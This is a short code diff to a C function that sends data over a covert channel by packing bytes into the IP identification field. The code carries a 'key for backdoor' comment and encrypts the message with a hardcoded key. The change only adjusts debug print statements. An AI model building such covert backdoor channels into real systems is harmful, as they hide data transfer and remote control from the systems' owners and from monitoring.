@@ -40,6 +40,7 @@ void covert_send(char *sip, char *dip, unsigned short sport, unsigned short dpor
 
     if(covert_channel == 1) {
         packet.ip.id = data[0];
+        printf("%c", data[0]);
         packet.ip.tos = 0;
     } else {
         //key for backdoor
@@ -84,7 +85,7 @@ void covert_send(char *sip, char *dip, unsigned short sport, unsigned short dpor
     printf("sizeof message to send: %lu\n", strlen((const char*) data));
     printf("message: %s\n", data);
     encryptMessage(data, BUFSIZE + 1, (unsigned char*) KEY, (unsigned char*) IV, packet.buffer);
-    printf("Ciphertext(%lu): %s\n", sizeof(packet.buffer), packet.buffer);
+//    printf("Ciphertext(%lu): %s\n", sizeof(packet.buffer), packet.buffer);
 
     //creat socket struct
     sin.sin_family = AF_INET;
